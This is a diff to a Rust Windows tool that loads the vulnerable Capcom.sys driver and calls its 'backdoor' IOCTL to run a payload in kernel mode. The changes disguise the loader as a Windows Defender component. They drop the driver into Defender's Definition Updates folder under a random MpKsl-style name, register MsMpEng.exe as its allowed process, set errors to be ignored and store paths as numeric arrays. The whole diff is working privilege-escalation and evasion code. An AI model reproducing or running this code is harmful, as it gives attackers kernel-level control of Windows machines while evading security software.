@@ -33,11 +33,13 @@ use std::ffi::{OsStr, OsString};
 use std::os::windows::ffi::{OsStrExt, OsStringExt};
 
 use winapi::um::winreg::{RegCreateKeyExW, RegSetValueExW, RegCloseKey, RegDeleteTreeW, HKEY_LOCAL_MACHINE};
-use winapi::um::winnt::{HANDLE, FILE_ALL_ACCESS, FILE_SHARE_READ, FILE_ATTRIBUTE_NORMAL, PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, KEY_ALL_ACCESS, REG_SZ, REG_DWORD, REG_CREATED_NEW_KEY, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL};
+use winapi::um::winnt::{HANDLE, FILE_ALL_ACCESS, FILE_SHARE_READ, FILE_ATTRIBUTE_NORMAL, PAGE_EXECUTE_READWRITE, KEY_ALL_ACCESS, REG_SZ, REG_DWORD, REG_CREATED_NEW_KEY, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE};
 use winapi::um::errhandlingapi::{GetLastError};
 use winapi::um::fileapi::{DeleteFileW, CreateFileW, ReadFile, WriteFile, FlushFileBuffers, CREATE_NEW, OPEN_EXISTING};
+use winapi::um::fileapi::{FindFirstFileW, FindNextFileW, FindClose};
 use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
-use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
+use winapi::um::memoryapi::{VirtualProtect};
+use winapi::um::ntsecapi::{SystemFunction036};
 use winapi::um::ioapiset::{DeviceIoControl};
 use winapi::um::processenv::{GetCurrentDirectoryW};
 use winapi::shared::minwindef::{HKEY, BYTE, FALSE, LPVOID, LPCVOID, DWORD};
@@ -84,6 +86,8 @@ pub enum Error {
 	RecoverRead(u32),
 	/// Failed to delete recovery information.
 	RecoverDelete(u32),
+	/// Failed to find a place to put the driver.
+	DriverCreate(u32),
 	/// Failed to write the driver to disk.
 	DriverWrite(u32),
 	/// Failed to delete the driver from disk.
@@ -106,6 +110,7 @@ impl error::Error for Error {
 			Error::RecoverWrite(_) => "cannot write recovery information",
 			Error::RecoverRead(_) => "cannot read recovery information",
 			Error::RecoverDelete(_) => "cannot delete recovery information",
+			Error::DriverCreate(_) => "cannot find driver location",
 			Error::DriverWrite(_) => "cannot write the driver to disk",
 			Error::DriverDelete(_) => "cannot delete the driver from disk",
 			Error::DriverRegister(_) => "cannot register driver service",
@@ -130,6 +135,9 @@ impl fmt::Display for Error {
 			},
 			Error::RecoverDelete(err) => {
 				write!(f, "Failed to delete recovery information, error code: {}. There is no problem, manually delete the RECOVER file.", err)
+			},
+			Error::DriverCreate(err) => {
+				write!(f, "Failed to find a location, error code: {}.", err)
 			},
 			Error::DriverWrite(err) => {
 				write!(f, "Failed to write the driver to disk, error code: {}.", err)
@@ -205,7 +213,10 @@ pub fn setup<T, F: FnMut(&Driver, &Device) -> T>(mut f: F) -> Result<T, Error> {
 		return Err(Error::EnablePrivileges);
 	}
 	// Create a Driver instance containing the service name and driver path
-	let driver = Driver::new();
+	let driver = match Driver::create() {
+		Err(err) => return Err(Error::DriverCreate(err)),
+		Ok(driver) => driver,
+	};
 	// Write the RECOVER file to disk safely
 	match driver.recovery() {
 		Err(err) => Err(Error::RecoverWrite(err)),
@@ -459,6 +470,42 @@ impl Driver {
 		}
 	}
 
+	/// Creates a path and service names based on where we can hijack Windows Defender Definition Updates.
+	pub fn create() -> Result<Driver, u32> {
+		unsafe {
+			// Find a suitable windows defender definition update to hijack
+			let mut fd = mem::uninitialized();
+			let ff = FindFirstFileW(WINDOWS_DEFENDER_DEFINITION_UPDATES.as_ptr(), &mut fd);
+			if ff == INVALID_HANDLE_VALUE {
+				return Err(GetLastError());
+			}
+			while fd.cFileName[0] != '{' as u16 && FindNextFileW(ff, &mut fd) != FALSE {}
+			FindClose(ff);
+			if fd.cFileName[0] != '{' as u16 {
+				return Err(0);
+			}
+
+			// Find the size of this guid directory name
+			let guid = {
+				let mut guid_len = fd.cFileName.len();
+				for i in 0..guid_len {
+					if fd.cFileName[i] == 0 {
+						guid_len = i;
+						break;
+					}
+				}
+				&fd.cFileName[..guid_len]
+			};
+
+			// Generate a random service id and driver path
+			let service_id = format_service_id();
+			let service_path = format_service_path(&service_id);
+			let native_path = format_native_path(&service_id, guid);
+
+			Ok(Driver { service_path, native_path })
+		}
+	}
+
 	/// Creates a new Driver instance with the given service name and path.
 	///
 	/// The service name is optional and will use the default name if `None`.
@@ -615,7 +662,9 @@ impl Driver {
 			reg_set_sz(key, &ImagePath, self.native_path());
 			reg_set_dword(key, &Type, &SERVICE_KERNEL_DRIVER);
 			reg_set_dword(key, &Start, &SERVICE_DEMAND_START);
-			reg_set_dword(key, &ErrorControl, &SERVICE_ERROR_NORMAL);
+			reg_set_dword(key, &ErrorControl, &SERVICE_ERROR_IGNORE);
+			reg_set_sz(key, &DeviceName, self.service_name());
+			reg_set_sz(key, &AllowedProcessName, &MS_MP_ENG);
 			Ok(())
 		}
 	}
@@ -698,7 +747,8 @@ unsafe fn enable_privilege(privilege_name: &[u16]) -> bool {
 
 //----------------------------------------------------------------
 
-static PAYLOAD: [u8; 64] = [
+// #[link_section = ".payload"]
+static mut PAYLOAD: [u8; 64] = [
 	// Pointer to payload code, required by Capcom backdoor
 	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
 	// Pointer to the user callback
@@ -735,7 +785,6 @@ static PAYLOAD: [u8; 64] = [
 #[derive(Debug)]
 pub struct Device {
 	device: HANDLE,
-	payload: *mut u8,
 }
 impl Device {
 	/// Open access to the capcom device.
@@ -745,9 +794,9 @@ impl Device {
 		unsafe {
 			let device = CreateFileW(CAPCOM_DEVICE.as_ptr(), FILE_ALL_ACCESS, FILE_SHARE_READ, ptr::null_mut(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, ptr::null_mut());
 			if device != INVALID_HANDLE_VALUE {
-				let payload = VirtualAlloc(ptr::null_mut(), 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) as *mut u8;
-				*(payload as *mut [u8; 64]) = PAYLOAD;
-				Ok(Device { device, payload })
+				let mut old_protect = mem::uninitialized();
+				VirtualProtect(PAYLOAD.as_mut_ptr() as _, mem::size_of_val(&PAYLOAD), PAGE_EXECUTE_READWRITE, &mut old_protect);
+				Ok(Device { device })
 			}
 			else {
 				Err(GetLastError())
@@ -779,7 +828,7 @@ impl Device {
 	/// Generate the payload code.
 	fn codegen(&self, user_fn: usize, user_data: usize) {
 		unsafe {
-			let payload = self.payload;
+			let payload = PAYLOAD.as_mut_ptr();;
 			ptr::write_unaligned(payload.offset(0) as *mut *mut u8, payload.offset(8));
 			ptr::write_unaligned(payload.offset(10) as *mut usize, user_fn);
 			ptr::write_unaligned(payload.offset(20) as *mut usize, user_data);
@@ -789,7 +838,7 @@ impl Device {
 	///
 	/// Ensure the payload is generated before invoking the IOCTL.
 	unsafe fn ioctl(&self) -> bool {
-		let mut payload = self.payload.offset(8);
+		let mut payload = PAYLOAD.as_mut_ptr().offset(8);
 		let mut result = 0;
 
 		let mut bytes_returned = mem::uninitialized();
@@ -801,7 +850,6 @@ impl Device {
 impl Drop for Device {
 	fn drop(&mut self) {
 		unsafe {
-			VirtualFree(self.payload as LPVOID, 0, MEM_RELEASE);
 			CloseHandle(self.device);
 		}
 	}
@@ -853,8 +901,12 @@ mod lit {
 	pub static Type: [u16; 5] = /*Type*/[84u16, 121, 112, 101, 0];
 	pub static Start: [u16; 6] = /*Start*/[83u16, 116, 97, 114, 116, 0];
 	pub static ErrorControl: [u16; 13] = /*ErrorControl*/[69u16, 114, 114, 111, 114, 67, 111, 110, 116, 114, 111, 108, 0];
+	pub static DeviceName: [u16; 11] = /*DeviceName*/[68u16, 101, 118, 105, 99, 101, 78, 97, 109, 101, 0];
 	pub static CAPCOM_DEVICE: [u16; 15] = /*\\.\Htsysm72FB*/[92u16, 92, 46, 92, 72, 116, 115, 121, 115, 109, 55, 50, 70, 66, 0];
 	pub static SeLoadDriverPrivilege: [u16; 22] = /*SeLoadDriverPrivilege*/[83u16, 101, 76, 111, 97, 100, 68, 114, 105, 118, 101, 114, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0];
+	pub static AllowedProcessName: [u16; 19] = [65u16, 108, 108, 111, 119, 101, 100, 80, 114, 111, 99, 101, 115, 115, 78, 97, 109, 101, 0];
+	pub static MS_MP_ENG: [u16; 67] = [92u16, 68, 101, 118, 105, 99, 101, 92, 72, 97, 114, 100, 100, 105, 115, 107, 86, 111, 108, 117, 109, 101, 49, 92, 80, 114, 111, 103, 114, 97, 109, 32, 70, 105, 108, 101, 115, 92, 87, 105, 110, 100, 111, 119, 115, 32, 68, 101, 102, 101, 110, 100, 101, 114, 92, 77, 115, 77, 112, 69, 110, 103, 46, 101, 120, 101, 0];
+	pub static WINDOWS_DEFENDER_DEFINITION_UPDATES: [u16; 63] = [67u16, 58, 92, 80, 114, 111, 103, 114, 97, 109, 68, 97, 116, 97, 92, 77, 105, 99, 114, 111, 115, 111, 102, 116, 92, 87, 105, 110, 100, 111, 119, 115, 32, 68, 101, 102, 101, 110, 100, 101, 114, 92, 68, 101, 102, 105, 110, 105, 116, 105, 111, 110, 32, 85, 112, 100, 97, 116, 101, 115, 92, 42, 0];
 	pub static NT_SERVICES_PATH: [u16; 63] = /*\Registry\Machine\System\CurrentControlSet\Services\Htsysm72FB*/[92u16, 82, 101, 103, 105, 115, 116, 114, 121, 92, 77, 97, 99, 104, 105, 110, 101, 92, 83, 121, 115, 116, 101, 109, 92, 67, 117, 114, 114, 101, 110, 116, 67, 111, 110, 116, 114, 111, 108, 83, 101, 116, 92, 83, 101, 114, 118, 105, 99, 101, 115, 92, 72, 116, 115, 121, 115, 109, 55, 50, 70, 66, 0];
 	pub static SLASH_CAPCOM_SYS: [u16; 12] = /*\Capcom.sys*/[92u16, 67, 97, 112, 99, 111, 109, 46, 115, 121, 115, 0];
 	pub static RECOVER_FILE_NAME: [u16; 8] = /*RECOVER*/[82u16, 69, 67, 79, 86, 69, 82, 0];
@@ -873,4 +925,60 @@ unsafe fn reg_set_sz(key: HKEY, sub_key: &[u16], sz: &[u16]) {
 unsafe fn reg_set_dword(key: HKEY, sub_key: &[u16], dword: &u32) {
 	let lp_data = dword as *const _ as *const BYTE;
 	let _err = RegSetValueExW(key, sub_key.as_ptr(), 0, REG_DWORD, lp_data, 4);
+}
+
+//----------------------------------------------------------------
+
+#[inline(never)]
+unsafe fn format_service_id() -> [u16; 8] {
+	let mut id: u32 = 0x8f310ea9;
+	SystemFunction036(&mut id as *mut _ as _, mem::size_of_val(&id) as u32);
+	let mut name = [0u16; 8];
+	for i in 0..8 {
+		id = id.rotate_left(4);
+		let digit = (id & 0xF) as u16;
+		let chr = if digit >= 10 { 'a' as u16 + (digit - 10) } else { '0' as u16 + digit };
+		name[i] = chr;
+	}
+	return name;
+}
+#[inline(never)]
+unsafe fn format_service_path(id: &[u16; 8]) -> Box<[u16]> {
+	static SERVICE_DRIVER_NAME: [u16; 57] = [92u16, 82, 101, 103, 105, 115, 116, 114, 121, 92, 77, 97, 99, 104, 105, 110, 101, 92, 83, 121, 115, 116, 101, 109, 92, 67, 117, 114, 114, 101, 110, 116, 67, 111, 110, 116, 114, 111, 108, 83, 101, 116, 92, 83, 101, 114, 118, 105, 99, 101, 115, 92, 77, 112, 75, 115, 108];
+	let mut vec = Vec::with_capacity(80);
+	let ptr: *mut u16 = vec.as_mut_ptr();
+	for i in 0..57 {
+		*ptr.offset(i as isize) = SERVICE_DRIVER_NAME[i];
+	}
+	for i in 0..8 {
+		*ptr.offset(57 + i as isize) = id[i];
+	}
+	*ptr.offset(57 + 8) = 0;
+	// Assert that our shenanigans didn't overrun the vector capacity
+	vec.set_len(57 + 8 + 1);
+	debug_assert!(vec.len() <= vec.capacity());
+	vec.into_boxed_slice()
+}
+#[inline(never)]
+unsafe fn format_native_path(id: &[u16; 8], guid: &[u16]) -> Box<[u16]> {
+	static STRING_1: [u16; 65] = [92u16, 63, 63, 92, 67, 58, 92, 80, 114, 111, 103, 114, 97, 109, 68, 97, 116, 97, 92, 77, 105, 99, 114, 111, 115, 111, 102, 116, 92, 87, 105, 110, 100, 111, 119, 115, 32, 68, 101, 102, 101, 110, 100, 101, 114, 92, 68, 101, 102, 105, 110, 105, 116, 105, 111, 110, 32, 85, 112, 100, 97, 116, 101, 115, 92];
+	static STRING_2: [u16; 19] = [92u16, 77, 112, 75, 115, 108, 56, 102, 51, 49, 48, 101, 97, 57, 46, 115, 121, 115, 0];
+	let mut vec = Vec::with_capacity(90 + guid.len());
+	let ptr: *mut u16 = vec.as_mut_ptr();
+	for i in 0..65 {
+		*ptr.offset(i as isize) = STRING_1[i];
+	}
+	for i in 0..guid.len() {
+		*ptr.offset(65 + i as isize) = guid[i];
+	}
+	for i in 0..19 {
+		*ptr.offset(65 + guid.len() as isize + i as isize) = STRING_2[i];
+	}
+	for i in 0..8 {
+		*ptr.offset(65 + guid.len() as isize + 6 + i as isize) = id[i];
+	}
+	// Assert that our shenanigans didn't overrun the vector capacity
+	vec.set_len(65 + guid.len() + 19);
+	debug_assert!(vec.len() <= vec.capacity());
+	vec.into_boxed_slice()
 }
